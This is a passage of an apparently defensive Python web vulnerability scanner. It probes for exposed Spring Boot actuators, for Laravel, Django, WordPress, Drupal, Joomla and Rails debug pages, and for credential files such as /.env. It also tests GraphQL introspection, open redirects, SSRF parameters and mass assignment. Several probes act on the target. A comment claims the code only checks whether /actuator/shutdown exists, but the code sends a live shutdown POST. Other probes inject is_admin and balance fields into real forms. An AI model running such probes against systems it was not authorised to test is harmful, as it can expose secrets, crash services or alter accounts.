                        f"Response size: {len(body_bytes)} bytes"
                    )
                    print(timestamp() + f" [!!] Actuator heapdump exposed (HPROF confirmed): {url} ({len(body_bytes)} bytes)")
                else:
                    print(timestamp() + f" Heapdump probe returned 200 but HPROF magic not found — likely WAF/CDN interference: {url}")
                continue

            # Require at least one body signature — a bare 200 with JSON
            # content-type is not sufficient (CDNs and reverse proxies can
            # return JSON error pages that match the content-type check).
            if any(sig in body for sig in ACTUATOR_BODY_SIGNATURES):
                alert(
                    "SPRING BOOT ACTUATOR EXPOSED",
                    severity,
                    url,
                    description
                )
                print(timestamp() + f" [!!] Actuator endpoint exposed [{severity}]: {url}")

        except Exception as e:
            print_error(f"check_actuator_exposure failed for {url}: {e}")

    # ── Shutdown endpoint — requires POST ─────────────────────────────────────
    # We only check whether the endpoint *exists* by sending a POST and reading
    # the response. We do NOT follow any redirect or retry. A 200 with a JSON
    # body containing "message" confirms the endpoint is live; a 401/403 means
    # it exists but is protected. We never call it twice (domain dedup above).
    shutdown_url = base_url.rstrip("/") + "/actuator/shutdown"
    try:
        stealth_delay(domain)
        shutdown_resp = _get_session().post(
            shutdown_url,
            headers=create_request_header(),
            timeout=5,
            allow_redirects=False,
            verify=False,
        )
        if shutdown_resp.status_code == 200:
            body = shutdown_resp.text
            if "message" in body.lower() or "shutdown" in body.lower():
                alert(
                    "SPRING BOOT ACTUATOR SHUTDOWN EXPOSED",
                    "CRITICAL",
                    shutdown_url,
                    "Spring Boot /actuator/shutdown accepted a POST request — "
                    "the endpoint is enabled and unauthenticated; an attacker can "
                    "remotely terminate the application process. Disable via "
                    "management.endpoint.shutdown.enabled=false"
                )
                print(timestamp() + f" [!!] Actuator shutdown EXPOSED: {shutdown_url}")
        elif shutdown_resp.status_code in (401, 403):
            print(timestamp() + f" Actuator shutdown exists (protected): {shutdown_url} [{shutdown_resp.status_code}]")
    except Exception as e:
        print_error(f"check_actuator_exposure (shutdown) failed for {shutdown_url}: {e}")


# ─────────────────────────────────────────────
# Technology-specific security checks
# ─────────────────────────────────────────────

_tech_specific_checked: set = set()


def _is_catch_all(base_url: str) -> bool:
    """
    Return True if the server returns 200 or a homepage redirect for a
    guaranteed-nonexistent path — indicates catch-all routing that would
    produce false positives on path-based probes.
    """
    canary = (base_url.rstrip("/")
              + "/nuscrape-canary-" + str(random.randint(100000, 999999)))
    try:
        resp = safe_get(canary, timeout=6)
        if not resp:
            return False
        if resp.status_code == 200:
            return True
        if resp.status_code in (301, 302, 303, 307, 308):
            loc = resp.headers.get("Location", "").rstrip("/")
            if loc in (base_url.rstrip("/"), "/", ""):
                return True
    except Exception:
        pass
    return False


def check_technology_specific(base_url: str, domain: str,
                               detected_techs: list) -> None:
    """
    Run targeted security checks once a CMS or framework is identified.

    Each check:
    - Uses the shared catch-all guard to avoid false positives
    - Only fires for confirmed technologies
    - Deduplicates per domain
    - Confirms findings with body or content-type signatures before alerting

    Covers: WordPress, Laravel, Spring Boot, Django, Ruby on Rails,
            Drupal, Joomla.
    """
    if not detected_techs:
        return
    if domain in _tech_specific_checked:
        return
    _tech_specific_checked.add(domain)

    tech_set = set(detected_techs)
    catch_all = _is_catch_all(base_url)
    if catch_all:
        print(timestamp() + f" [tech] Catch-all server on {domain} — path probes will use body confirmation")

    def _probe(path: str, method: str = "get") -> tuple:
        """GET/POST a path; returns (status, body_text, content_type)."""
        try:
            stealth_delay(domain)
            url = base_url.rstrip("/") + path
            resp = _get_session().request(
                method, url,
                headers=create_request_header(),
                timeout=8,
                allow_redirects=False,
                verify=False,
            )
            return resp.status_code, resp.text, resp.headers.get("Content-Type", "")
        except Exception:
            return 0, "", ""

    # ── WordPress ─────────────────────────────────────────────────────────────
    if "WordPress" in tech_set:
        # /wp-login.php
        status, body, ct = _probe("/wp-login.php")
        if status == 200 and ("wp-login" in body.lower() or "wordpress" in body.lower()
                              or "password" in body.lower()):
            alert(
                "WORDPRESS LOGIN PAGE EXPOSED",
                "MEDIUM",
                base_url + "/wp-login.php",
                "WordPress login page is publicly accessible — enables credential "
                "brute-force attacks. Consider restricting access by IP or adding "
                "rate limiting and lockout policies."
            )
            print(timestamp() + f" [!] WordPress wp-login.php exposed: {domain}")

        # /xmlrpc.php
        status, body, ct = _probe("/xmlrpc.php")
        if status == 200 and ("xmlrpc" in body.lower() or "xml" in ct.lower()):
            alert(
                "WORDPRESS XMLRPC ENABLED",
                "MEDIUM",
                base_url + "/xmlrpc.php",
                "WordPress XML-RPC interface is accessible — enables brute-force "
                "amplification via system.multicall, SSRF to internal services, "
                "and denial of service. Disable unless required by a plugin."
            )
            print(timestamp() + f" [!] WordPress xmlrpc.php accessible: {domain}")

        # /wp-json/wp/v2/users — unauthenticated user enumeration
        status, body, ct = _probe("/wp-json/wp/v2/users")
        if status == 200 and "application/json" in ct.lower():
            try:
                users = json.loads(body)
                if isinstance(users, list) and users:
                    names = [u.get("slug") or u.get("name", "?") for u in users[:5]]
                    alert(
                        "WORDPRESS USER ENUMERATION",
                        "HIGH",
                        base_url + "/wp-json/wp/v2/users",
                        f"REST API returns {len(users)} user record(s) without "
                        f"authentication: {', '.join(str(n) for n in names)}. "
                        f"Disable the users endpoint or restrict to authenticated "
                        f"requests via 'Disable REST API' plugin."
                    )
                    print(timestamp() + f" [!!] WordPress user enum ({len(users)} users): {domain}")
            except Exception:
                pass

        # /wp-content/debug.log
        status, body, ct = _probe("/wp-content/debug.log")
        if status == 200 and (
            "php" in body.lower() or "error" in body.lower()
            or "warning" in body.lower() or "notice" in body.lower()
        ):
            alert(
                "WORDPRESS DEBUG LOG EXPOSED",
                "HIGH",
                base_url + "/wp-content/debug.log",
                "WordPress debug.log is publicly accessible — contains PHP errors, "
                "file system paths, database query errors, and stack traces that "
                "assist targeted exploitation. Remove or restrict with nginx/Apache rules."
            )
            print(timestamp() + f" [!!] WordPress debug.log accessible: {domain}")

    # ── Laravel ───────────────────────────────────────────────────────────────
    if "Laravel" in tech_set:
        # /storage/logs/laravel.log
        status, body, ct = _probe("/storage/logs/laravel.log")
        if status == 200 and (
            "[" in body and (
                "laravel" in body.lower() or "exception" in body.lower()
                or "error" in body.lower() or "stack trace" in body.lower()
            )
        ):
            alert(
                "LARAVEL LOG FILE EXPOSED",
                "HIGH",
                base_url + "/storage/logs/laravel.log",
                "Laravel application log is publicly accessible — may contain "
                "stack traces, file system paths, SQL queries, environment details, "
                "and session tokens. Restrict the /storage/ directory in the web server."
            )
            print(timestamp() + f" [!!] Laravel laravel.log exposed: {domain}")

        # /.env — checked here in addition to the generic check_env_exposure
        # for a Laravel-specific body confirmation
        status, body, ct = _probe("/.env")
        if status == 200 and any(k in body for k in ("APP_KEY", "DB_PASSWORD", "DB_HOST",
                                                       "MAIL_PASSWORD", "AWS_SECRET")):
            alert(
                "LARAVEL ENV FILE EXPOSED",
                "CRITICAL",
                base_url + "/.env",
                ".env configuration file is publicly accessible — contains APP_KEY "
                "(used for encryption/signing), database credentials, mail server "
                "passwords, and third-party API keys. Rotate all secrets immediately "
                "and restrict the file via web server configuration."
            )
            print(timestamp() + f" [!!] Laravel .env exposed: {domain}")

        # /telescope — Laravel Telescope debug dashboard
        status, body, ct = _probe("/telescope")
        if status == 200 and not catch_all and (
            "telescope" in body.lower() or "laravel" in body.lower()
        ):
            alert(
                "LARAVEL TELESCOPE EXPOSED",
                "HIGH",
                base_url + "/telescope",
                "Laravel Telescope dashboard is accessible without authentication — "
                "exposes full HTTP request/response history, SQL queries, queued jobs, "
                "cache operations, and exception details. Restrict to local env or "
                "add gate() authorization in TelescopeServiceProvider."
            )
            print(timestamp() + f" [!!] Laravel Telescope exposed: {domain}")

        # /horizon — Laravel Horizon queue dashboard
        status, body, ct = _probe("/horizon")
        if status == 200 and not catch_all and (
            "horizon" in body.lower() or "laravel" in body.lower()
            or "queue" in body.lower()
        ):
            alert(
                "LARAVEL HORIZON EXPOSED",
                "HIGH",
                base_url + "/horizon",
                "Laravel Horizon dashboard is accessible without authentication — "
                "exposes queue worker configuration, failed job history, throughput "
                "metrics, and job payload data. Add gate() authorization in "
                "HorizonServiceProvider."
            )
            print(timestamp() + f" [!!] Laravel Horizon exposed: {domain}")

        # Debug mode — probe a nonexistent path and check for Whoops/Ignition
        rand_path = f"/nuscrape-laravel-debug-{random.randint(10000, 99999)}"
        status, body, ct = _probe(rand_path)
        if "whoops" in body.lower() or "ignition" in body.lower() \
                or ("stack trace" in body.lower() and "laravel" in body.lower()):
            alert(
                "LARAVEL DEBUG MODE ENABLED",
                "HIGH",
                base_url,
                "Laravel debug mode (APP_DEBUG=true) is active in production — "
                "Whoops/Ignition error pages expose full stack traces, source file "
                "contents, request variables, and environment configuration on "
                "unhandled exceptions. Set APP_DEBUG=false in .env."
            )
            print(timestamp() + f" [!!] Laravel debug mode detected: {domain}")

    # ── Spring Boot ───────────────────────────────────────────────────────────
    # Actuator endpoint probing is already handled by check_actuator_exposure
    # (which runs unconditionally in _exposure_tasks). Here we only confirm
    # that the Whitelabel error page is present as a secondary signal.
    if "Spring Boot" in tech_set:
        rand_path = f"/nuscrape-spring-{random.randint(10000, 99999)}"
        status, body, ct = _probe(rand_path)
        if "whitelabel error page" in body.lower():
            print(timestamp() + f" [*] Spring Boot Whitelabel error page confirmed: {domain}")
            write_to_tech_database(base_url, "Spring Boot (Whitelabel confirmed)")

    # ── Django ────────────────────────────────────────────────────────────────
    if "Django" in tech_set:
        # Trigger a 404 on a nonexistent path and check for the debug page
        rand_path = f"/nuscrape-django-{random.randint(10000, 99999)}"
        status, body, ct = _probe(rand_path)
        if status == 404 and (
            "using the urlconf" in body.lower()
            or "django tried these url patterns" in body.lower()
            or ("debugtoolbar" in body.lower())
        ):
            ver_m = re.search(r'django[/ ](\d+\.\d+)', body, re.I)
            ver_str = f" (Django {ver_m.group(1)})" if ver_m else ""
            alert(
                "DJANGO DEBUG MODE ENABLED",
                "HIGH",
                base_url,
                f"Django debug mode is active in production{ver_str} — the 404 "
                f"debug page exposes all configured URL patterns, installed apps, "
                f"Django and Python versions. Set DEBUG=False in settings.py."
            )
            print(timestamp() + f" [!!] Django debug mode detected: {domain}")

        # /admin/
        status, body, ct = _probe("/admin/")
        if status == 200 and not catch_all and (
            "django" in body.lower() or "log in" in body.lower()
            or "password" in body.lower()
        ):
            alert(
                "DJANGO ADMIN PANEL ACCESSIBLE",
                "MEDIUM",
                base_url + "/admin/",
                "Django admin panel is publicly accessible. Verify it is protected "
                "by strong credentials and is not exposed to the public internet; "
                "consider restricting by IP via web server configuration."
            )
            print(timestamp() + f" [!] Django /admin/ accessible: {domain}")

        # Django Debug Toolbar /__debug__/
        status, body, ct = _probe("/__debug__/")
        if status == 200 and not catch_all:
            alert(
                "DJANGO DEBUG TOOLBAR EXPOSED",
                "MEDIUM",
                base_url + "/__debug__/",
                "Django Debug Toolbar endpoint is publicly accessible — may expose "
                "SQL query history, request context, settings values, and template "
                "context. Remove django-debug-toolbar from INSTALLED_APPS in production."
            )
            print(timestamp() + f" [!] Django Debug Toolbar /__debug__/ exposed: {domain}")

    # ── Ruby on Rails ─────────────────────────────────────────────────────────
    if "Ruby on Rails" in tech_set:
        # /rails/info/properties
        status, body, ct = _probe("/rails/info/properties")
        if status == 200 and (
            "ruby" in body.lower() or "rails" in body.lower()
            or "middleware" in body.lower()
        ):
            alert(
                "RAILS INFO PROPERTIES EXPOSED",
                "HIGH",
                base_url + "/rails/info/properties",
                "/rails/info/properties is publicly accessible — exposes Ruby and "
                "Rails version numbers, loaded middleware stack, and route information. "
                "Restrict in production: config.consider_all_requests_local = false"
            )
            print(timestamp() + f" [!!] Rails /rails/info/properties exposed: {domain}")

        # /rails/mailers
        status, body, ct = _probe("/rails/mailers")
        if status == 200 and not catch_all and (
            "mailer" in body.lower() or "preview" in body.lower()
        ):
            alert(
                "RAILS MAILERS PREVIEW EXPOSED",
                "MEDIUM",
                base_url + "/rails/mailers",
                "Action Mailer preview endpoint is publicly accessible — exposes "
                "email template content and internal mailer configuration. "
                "Restrict via show_previews config or IP allowlist."
            )
            print(timestamp() + f" [!] Rails /rails/mailers exposed: {domain}")

    # ── Drupal ────────────────────────────────────────────────────────────────
    if "Drupal" in tech_set:
        # /CHANGELOG.txt — version disclosure
        status, body, ct = _probe("/CHANGELOG.txt")
        if status == 200 and "drupal" in body[:200].lower():
            ver_m = re.search(r'drupal\s+(\d+\.\d+[\.\d]*)', body, re.I)
            ver_str = f" ({ver_m.group(0)})" if ver_m else ""
            alert(
                "DRUPAL VERSION DISCLOSURE",
                "LOW",
                base_url + "/CHANGELOG.txt",
                f"CHANGELOG.txt is publicly accessible{ver_str} — discloses the "
                f"exact Drupal version, enabling targeted lookup of known CVEs. "
                f"Remove this file or deny access via web server configuration."
            )
            print(timestamp() + f" [!] Drupal CHANGELOG.txt accessible: {domain}")

        # /sites/default/settings.php
        status, body, ct = _probe("/sites/default/settings.php")
        if status == 200 and (
            "database" in body.lower() or "$databases" in body
            or "$db_url" in body or "drupal" in body.lower()
        ):
            alert(
                "DRUPAL SETTINGS FILE EXPOSED",
                "CRITICAL",
                base_url + "/sites/default/settings.php",
                "Drupal settings.php is publicly readable — contains database "
                "credentials, trusted_host_patterns, and installation-specific "
                "configuration. Fix file permissions (chmod 440 or 444)."
            )
            print(timestamp() + f" [!!] Drupal settings.php exposed: {domain}")

        # /admin/
        status, body, ct = _probe("/admin/")
        if status == 200 and not catch_all and (
            "drupal" in body.lower() or "log in" in body.lower()
            or "administer" in body.lower()
        ):
            alert(
                "DRUPAL ADMIN PANEL ACCESSIBLE",
                "MEDIUM",
                base_url + "/admin/",
                "Drupal admin panel is publicly accessible. Verify it is protected "
                "by strong credentials and not reachable from the public internet."
            )
            print(timestamp() + f" [!] Drupal /admin/ accessible: {domain}")

    # ── Joomla ────────────────────────────────────────────────────────────────
    if "Joomla" in tech_set:
        # /administrator/
        status, body, ct = _probe("/administrator/")
        if status == 200 and not catch_all and (
            "joomla" in body.lower() or "administrator" in body.lower()
            or "password" in body.lower()
        ):
            alert(
                "JOOMLA ADMIN PANEL ACCESSIBLE",
                "MEDIUM",
                base_url + "/administrator/",
                "Joomla administrator panel is publicly accessible. Consider "
                "restricting access by IP address and enabling two-factor "
                "authentication in Joomla's user management settings."
            )
            print(timestamp() + f" [!] Joomla /administrator/ accessible: {domain}")

        # /configuration.php.bak
        status, body, ct = _probe("/configuration.php.bak")
        if status == 200 and (
            "joomla" in body.lower() or "secret" in body.lower()
            or "db_host" in body.lower() or "public $db" in body.lower()
        ):
            alert(
                "JOOMLA CONFIGURATION BACKUP EXPOSED",
                "CRITICAL",
                base_url + "/configuration.php.bak",
                "Joomla configuration.php.bak is publicly accessible — contains "
                "database credentials, secret key, FTP credentials, and full "
                "application configuration. Delete this file immediately."
            )
            print(timestamp() + f" [!!] Joomla configuration.php.bak exposed: {domain}")

        # /README.txt — version disclosure
        status, body, ct = _probe("/README.txt")
        if status == 200 and "joomla" in body.lower():
            ver_m = re.search(r'joomla[!]?\s+(\d+\.\d+[\.\d]*)', body, re.I)
            ver_str = f" ({ver_m.group(0)})" if ver_m else ""
            alert(
                "JOOMLA VERSION DISCLOSURE",
                "LOW",
                base_url + "/README.txt",
                f"README.txt is publicly accessible{ver_str} — discloses the Joomla "
                f"version, aiding targeted exploitation of known CVEs. "
                f"Remove this file from production."
            )
            print(timestamp() + f" [!] Joomla README.txt accessible: {domain}")


# ─────────────────────────────────────────────
# GraphQL introspection detection
# ─────────────────────────────────────────────

GRAPHQL_PATHS = [
    "/graphql", "/graphql/", "/api/graphql", "/api/graphql/",
    "/v1/graphql", "/v2/graphql", "/query", "/gql",
    "/graphiql", "/playground",
]

GRAPHQL_INTROSPECTION_QUERY = '{"query":"{__schema{types{name fields{name}}}}"}'

GRAPHQL_INTROSPECTION_INDICATORS = [
    "__schema", "__typename", "queryType", "mutationType",
    "types", "directives",
]

_graphql_checked    = set()
_graphql_url_probed = set()   # dedup for per-page URL probing

# Error messages returned when introspection is present but explicitly disabled.
_GRAPHQL_DISABLED_INDICATORS = [
    "introspection is disabled",
    "IntrospectionDisabled",
    "GraphQL introspection is not allowed",
    "not allowed to run introspection queries",
    "Introspection queries are not allowed",
    "introspection not allowed",
    "introspection has been disabled",
]

# URL path fragments that suggest a GraphQL endpoint
_GRAPHQL_PATH_HINTS = ("graphql", "graph", "/api")

def _probe_graphql_endpoint(url, domain):
    """
    Send an introspection query to a single URL and return the verdict:
      'enabled'  — schema data confirmed (HIGH)
      'disabled' — endpoint exists but introspection is off (MEDIUM)
      None       — not a GraphQL endpoint or no response
    """
    try:
        stealth_delay(domain)
        resp = _get_session().post(
            url,
            data=GRAPHQL_INTROSPECTION_QUERY,
            headers={**create_request_header(), "Content-Type": "application/json"},
            timeout=6,
            allow_redirects=False,
        )
        if resp.status_code not in (200, 201, 400):
            return None
        body = resp.text
        ct   = resp.headers.get("Content-Type", "")

        # Check for introspection-disabled error first (often a 400 or 200 with error body)
        if any(ind.lower() in body.lower() for ind in _GRAPHQL_DISABLED_INDICATORS):
            return "disabled"

        if resp.status_code not in (200, 201):
            return None
        if "json" not in ct and "__schema" not in body:
            return None

        matched = [ind for ind in GRAPHQL_INTROSPECTION_INDICATORS if ind in body]
        if len(matched) >= 2:
            return "enabled"
    except Exception as e:
        print_error(f"GraphQL probe failed for {url}: {e}")
    return None


def probe_graphql_url(page_url):
    """
    Called per crawled page. If the URL path contains a GraphQL hint
    ('graphql', 'graph', '/api'), probe that specific URL with an
    introspection query. Deduplicates via _graphql_url_probed.
    """
    try:
        parsed = urlparse(page_url)
        path   = parsed.path.lower()
        if not any(hint in path for hint in _GRAPHQL_PATH_HINTS):
            return
        probe_url = parsed.scheme + "://" + parsed.netloc + parsed.path
        if probe_url in _graphql_url_probed:
            return
        _graphql_url_probed.add(probe_url)

        domain = parsed.netloc
        verdict = _probe_graphql_endpoint(probe_url, domain)
        if verdict == "enabled":
            type_count = 0
            try:
                resp = _get_session().post(
                    probe_url,
                    data=GRAPHQL_INTROSPECTION_QUERY,
                    headers={**create_request_header(), "Content-Type": "application/json"},
                    timeout=6,
                    allow_redirects=False,
                )
                type_count = resp.text.count('"name"')
            except Exception:
                pass
            alert(
                "GRAPHQL INTROSPECTION ENABLED",
                "HIGH",
                probe_url,
                f"Full API schema exposed at crawled endpoint — {type_count} name fields visible"
            )
            print(timestamp() + f" [!!] GraphQL introspection enabled: {probe_url}")
        elif verdict == "disabled":
            alert(
                "GRAPHQL ENDPOINT FOUND: INTROSPECTION DISABLED",
                "MEDIUM",
                probe_url,
                f"GraphQL endpoint exists at {probe_url} but introspection is disabled — "
                f"API is present, manual probing may still be possible"
            )
            print(timestamp() + f" [!] GraphQL endpoint (introspection disabled): {probe_url}")
    except Exception as e:
        print_error(f"probe_graphql_url failed for {page_url}: {e}")


def check_graphql_introspection(base_url, domain):
    """
    Probe common GraphQL paths on a host and test whether introspection is enabled.
    Introspection in production exposes the full API schema to unauthenticated
    attackers. Alerts HIGH when confirmed, MEDIUM when endpoint exists but
    introspection is explicitly disabled.
    Only called when --active-probes is enabled.
    """
    if domain in _graphql_checked:
        return
    _graphql_checked.add(domain)

    for path in GRAPHQL_PATHS:
        url = base_url.rstrip("/") + path
        if url in _graphql_url_probed:
            continue   # already probed by per-page path check
        _graphql_url_probed.add(url)

        verdict = _probe_graphql_endpoint(url, domain)
        if verdict == "enabled":
            try:
                resp = _get_session().post(
                    url,
                    data=GRAPHQL_INTROSPECTION_QUERY,
                    headers={**create_request_header(), "Content-Type": "application/json"},
                    timeout=6,
                    allow_redirects=False,
                )
                type_count = resp.text.count('"name"')
            except Exception:
                type_count = 0
            alert(
                "GRAPHQL INTROSPECTION ENABLED",
                "HIGH",
                url,
                f"Full API schema exposed — {type_count} name fields visible"
            )
            print(timestamp() + f" [!!] GraphQL introspection enabled: {url}")
            return   # one confirmed endpoint is enough to alert per host
        elif verdict == "disabled":
            alert(
                "GRAPHQL ENDPOINT FOUND: INTROSPECTION DISABLED",
                "MEDIUM",
                url,
                f"GraphQL endpoint exists at {url} but introspection is disabled — "
                f"API is present, manual probing may still be possible"
            )
            print(timestamp() + f" [!] GraphQL endpoint (introspection disabled): {url}")


# ─────────────────────────────────────────────
# SSRF candidate parameter flagging
# ─────────────────────────────────────────────

# Parameter names that commonly accept URLs or remote resources.
# Presence of these on an auth-gated or server-side endpoint is an SSRF risk.
SSRF_PARAM_NAMES = {
    "url", "uri", "redirect", "callback", "return", "returnurl", "return_url",
    "returnto", "return_to", "next", "target", "dest", "destination",
    "go", "goto", "link", "src", "source", "ref", "referrer", "image",
    "img", "proxy", "fetch", "load", "remote", "endpoint", "service",
    "webhook", "notify", "ping", "host", "site", "feed", "data",
    "path", "file", "open", "domain", "port", "to", "from",
}

_ssrf_flagged = set()   # domains already flagged (one alert per domain)

def flag_ssrf_candidates(page_url, html_content):
    """
    Scan page links and form inputs for URL-accepting parameter names.
    These are common SSRF entry points — flags them as MEDIUM candidates
    for manual follow-up testing. Does not make any requests.
    """
    domain = urlparse(page_url).netloc
    if domain in _ssrf_flagged:
        return
    if is_third_party_cdn(domain):
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    found = set()

    # Query params from all hrefs/actions on the page
    for tag in soup.find_all(["a", "form", "link"]):
        href = tag.get("href") or tag.get("action") or ""
        if href:
            try:
                parsed = urlparse(href)
                for pair in (parsed.query or "").split("&"):
                    if "=" in pair:
                        k, _ = pair.split("=", 1)
                        if k.lower() in SSRF_PARAM_NAMES:
                            found.add(k.lower())
            except Exception:
                pass

    # Also check the current page URL's own params
    try:
        parsed = urlparse(page_url)
        for pair in (parsed.query or "").split("&"):
            if "=" in pair:
                k, _ = pair.split("=", 1)
                if k.lower() in SSRF_PARAM_NAMES:
                    found.add(k.lower())
    except Exception:
        pass

    # Form input names
    for inp in soup.find_all("input"):
        name = (inp.get("name") or "").lower()
        if name in SSRF_PARAM_NAMES:
            found.add(name)

    if found:
        _ssrf_flagged.add(domain)
        param_list = ", ".join(sorted(found))
        # If the page itself is a WAF intercept, downgrade — the params are
        # not reachable application inputs, they are WAF-generated artifacts
        waf = _response_waf_provider_from_text(text)
        if waf:
            alert(
                "SSRF CANDIDATE PARAMETERS DETECTED (UNCONFIRMED — WAF)",
                "LOW",
                page_url,
                f"URL-accepting parameters found but {waf} WAF fingerprint detected on page — may not reach real application: {param_list}"
            )
        else:
            alert(
                "SSRF CANDIDATE PARAMETERS DETECTED",
                "MEDIUM",
                page_url,
                f"URL-accepting parameters found — manually test for SSRF: {param_list}"
            )
        print(timestamp() + f" SSRF candidates on {domain}: {param_list}")


# ─────────────────────────────────────────────
# Open redirect detection
# ─────────────────────────────────────────────

REDIRECT_PARAMS = {
    "next", "url", "redirect", "redirect_url", "redirect_uri",
    "return", "return_to", "returnTo", "returnUrl", "return_url",
    "goto", "go", "dest", "destination", "target", "redir",
    "continue", "forward", "location", "ref", "referer",
    "callback", "callback_url", "jump", "link", "out", "r",
    "to", "uri", "path",
}

REDIRECT_CANARY  = "https://example.com/nuscrape-redirect-test"
_redirect_tested  = set()
_redirect_domains = set()

def _redirect_to_canary(location):
    """
    Return True only when the Location header points to the canary domain.
    Uses proper URL parsing to avoid false positives like example.com.attacker.com.
    """
    if not location:
        return False
    try:
        loc = location.strip()
        # Handle protocol-relative URLs (//example.com/...)
        if loc.startswith("//"):
            loc = "https:" + loc
        parsed = urlparse(loc)
        netloc = parsed.netloc.lower()
        # Strip port if present
        netloc = netloc.split(":")[0]
        # Strip leading www.
        if netloc.startswith("www."):
            netloc = netloc[4:]
        canary = "example.com"
        return netloc == canary or netloc.endswith("." + canary)
    except Exception:
        return False


def check_open_redirects(page_url, html_content):
    """
    Parse links on the page for URL parameters that accept redirect
    destinations. Inject an external canary and check if the response
    redirects there. Alerts HIGH on confirmed open redirect.
    """
    domain = urlparse(page_url).netloc
    if domain in _redirect_domains:
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    candidate_urls = set()
    for tag in soup.find_all(["a", "form", "link"]):
        href = tag.get("href") or tag.get("action") or ""
        if href and href.startswith("http"):
            candidate_urls.add(href)
    candidate_urls.add(page_url)

    redirect_params_lower = {p.lower() for p in REDIRECT_PARAMS}

    for candidate in candidate_urls:
        if domain in _redirect_domains:
            break
        try:
            parsed = urlparse(candidate)
            if not parsed.query:
                continue
            params = {}
            for pair in parsed.query.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    params[k] = v
        except Exception:
            continue

        for param, value in params.items():
            if param.lower() not in redirect_params_lower:
                continue

            test_key = (parsed.scheme + "://" + parsed.netloc + parsed.path, param)
            if test_key in _redirect_tested:
                continue
            _redirect_tested.add(test_key)

            new_query = "&".join(
                f"{k}={REDIRECT_CANARY}" if k == param else f"{k}={v}"
                for k, v in params.items()
            )
            test_url = parsed.scheme + "://" + parsed.netloc + parsed.path + "?" + new_query

            try:
                stealth_delay(domain)
                resp = _get_session().get(
                    test_url,
                    headers=create_request_header(),
                    timeout=5,
                    allow_redirects=False,
                )
                location = resp.headers.get("Location", "")
                if _is_akamai_block(resp):
                    continue
                if resp.status_code in (301, 302, 303, 307, 308) and \
                   _redirect_to_canary(location):
                    _redirect_domains.add(domain)
                    alert(
                        "OPEN REDIRECT",
                        "HIGH",
                        test_url,
                        f"Parameter '{param}' redirects to injected URL. "
                        f"Location: {location[:120]}"
                    )
                    print(timestamp() + f" [!!] Open redirect: {test_url} → {location[:80]}")
                    break
            except Exception as e:
                print_error(f"Open redirect test failed for {test_url}: {e}")


# ─────────────────────────────────────────────
# Mass assignment detection
# ─────────────────────────────────────────────

# Field names that should never be accepted from client input but are
# commonly left writable in frameworks that auto-bind request bodies
# to model objects (Rails, Spring, Django, Laravel, etc.).
_MASS_ASSIGN_FIELDS = [
    "role", "admin", "is_admin", "isAdmin", "user_role", "permission",
    "permissions", "is_superuser", "verified", "is_verified", "balance",
    "credits", "group_id",
]

_mass_assign_tested = set()

def check_mass_assignment(page_url, html_content):
    """
    Discover POST/PUT endpoints from page forms, inject the sensitive field
    names alongside legitimate form fields, and check whether any injected
    name appears reflected in the response body or headers.

    A reflection indicates the server accepted and echoed the field — strong
    signal that mass assignment is possible. Flags HIGH; manual verification
    of whether the server *processed* (not just echoed) the field is required.

    Only runs when --active-probes is enabled. Deduplicates per endpoint URL.
    """
    domain = urlparse(page_url).netloc

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    # Build a list of (endpoint_url, method, base_fields) from page forms
    endpoints = []
    for form in soup.find_all("form"):
        method = form.get("method", "get").upper()
        if method not in ("POST", "PUT"):
            continue
        action = form.get("action") or page_url
        endpoint_url = urljoin(page_url, action)
        # Stay in scope — skip cross-origin form actions
        if urlparse(endpoint_url).netloc != domain:
            continue
        # Collect existing field values to send alongside injected fields
        fields = {}
        for inp in form.find_all(["input", "textarea", "select"]):
            name = inp.get("name", "")
            val  = inp.get("value") or "test"
            if name and inp.get("type", "").lower() not in ("submit", "button", "image", "reset"):
                fields[name] = val
        endpoints.append((endpoint_url, method, fields))

    # Also probe the current page URL if it looks like a REST API endpoint
    parsed_page = urlparse(page_url)
    if any(seg in parsed_page.path for seg in ("/api/", "/v1/", "/v2/", "/v3/", "/rest/")):
        endpoints.append((page_url, "POST", {}))

    for endpoint_url, method, base_fields in endpoints:
        if endpoint_url in _mass_assign_tested:
            continue
        _mass_assign_tested.add(endpoint_url)

        # Build payload: existing fields + all injected sensitive fields
        payload = dict(base_fields)
        injected = {}
        for field in _MASS_ASSIGN_FIELDS:
            if field not in payload:
                # Use truthy values to maximise chance of reflection
                injected[field] = True if ("is_" in field or field in ("admin", "verified")) else 1
        payload.update(injected)

        try:
            stealth_delay(domain)
            resp = _get_session().request(
                method,
                endpoint_url,
                json=payload,
                headers={**create_request_header(), "Content-Type": "application/json"},
                timeout=6,
                allow_redirects=False,
                verify=False,
            )
            body             = resp.text
            resp_headers_str = str(dict(resp.headers))
            reflected = [f for f in injected if f in body or f in resp_headers_str]
            if reflected:
                alert(
                    "MASS ASSIGNMENT CANDIDATE",
                    "HIGH",
                    endpoint_url,
                    f"{method} {endpoint_url} reflected injected field(s): "
                    f"{', '.join(reflected)} — verify manually whether the server "
                    f"accepted and processed these privileged fields"
                )
                print(timestamp() + f" [!!] Mass assignment candidate: {endpoint_url} "
                                    f"reflected: {', '.join(reflected)}")
        except Exception as e:
            print_error(f"check_mass_assignment failed for {endpoint_url}: {e}")


# ─────────────────────────────────────────────
# API version enumeration
# ─────────────────────────────────────────────

_API_VERSION_RE   = re.compile(r'/(v\d+)(?=/|$)', re.I)
_api_version_tested = set()

def check_api_versioning(page_url):
    """
    For any URL with a versioned path segment (/v1/, /v2/, etc.), probe
    adjacent versions to find older endpoints that may lack the security
    controls present in the current version.

    Versions tested: current-2, current-1, current+1.
    A 404 or 401/403 on the alternate version is silently skipped.

    Severity:
      HIGH   — alternate version returns 200 where current requires auth (401/403)
      MEDIUM — alternate version returns 200 (different accessibility, verify manually)

    Only runs when --active-probes is enabled. Deduplicates per (host, path) pattern.
    """
    parsed = urlparse(page_url)
    match  = _API_VERSION_RE.search(parsed.path)
    if not match:
        return

    current_ver_str = match.group(1).lower()       # e.g. "v2"
    current_ver_num = int(current_ver_str[1:])     # e.g. 2

    pattern_key = (parsed.netloc, parsed.path)
    if pattern_key in _api_version_tested:
        return
    _api_version_tested.add(pattern_key)

    domain = parsed.netloc
